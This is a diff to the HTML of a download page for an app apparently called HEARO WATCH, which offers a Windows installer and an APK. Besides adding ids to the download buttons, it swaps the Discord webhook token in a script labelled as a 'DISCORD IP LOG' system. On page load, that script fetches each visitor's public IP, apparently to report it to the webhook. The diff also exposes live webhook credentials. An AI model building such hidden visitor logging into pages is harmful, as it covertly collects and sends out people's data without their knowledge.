@@ -389,10 +389,10 @@
                 <p style="color: var(--text-secondary); margin-bottom: 3rem; font-size: 1.2rem;">Download the official HEARO WATCH to join rooms, host parties, and chat with friends.</p>
 
                 <div style="display: flex; justify-content: center; gap: 2rem; flex-wrap: wrap;">
-                    <a href="https://github.com/hearoholder/hearo-main/releases/download/v2.3.1/hearo-desktop-setup-v2.3.1.zip" class="btn btn-primary" style="padding: 1rem 3rem; font-size: 1.2rem;">
+                    <a href="https://github.com/hearoholder/hearo-main/releases/download/v2.3.1/hearo-desktop-setup-v2.3.1.zip" id="download-win" class="btn btn-primary" style="padding: 1rem 3rem; font-size: 1.2rem;">
                         <i class="fa-brands fa-windows" style="margin-right: 10px;"></i> Download for Windows
                     </a>
-                    <a href="https://github.com/hearoholder/hearo-main/releases/download/v2.3.1/hearo-mobile.apk" download="hearo-mobile.apk" class="btn btn-primary" style="padding: 1rem 3rem; font-size: 1.2rem;">
+                    <a href="https://github.com/hearoholder/hearo-main/releases/download/v2.3.1/hearo-mobile.apk" id="download-mobile" download="hearo-mobile.apk" class="btn btn-primary" style="padding: 1rem 3rem; font-size: 1.2rem;">
                         <i class="fa-solid fa-mobile-screen" style="margin-right: 10px;"></i> Download for Mobile
                     </a>
                 </div>
@@ -526,7 +526,7 @@
     
     <!-- DISCORD IP LOG SİSTEMİ -->
     <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1544340416248160318/p16WUgfuyXs2EDV9iCGiW4uwR-Y9cQbbJON5ACBHfeGryK6oJTgjjZhXiTitzfgeXIvs";
+        const webhookUrl = "https://discord.com/api/webhooks/1544743774935195771/-NJECDevQjAxJRCieNLlGWtePr_6nVJeauDHk3zfS6bUgUXhJRTTRF4J68ZDPTNu_aEE";
 
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
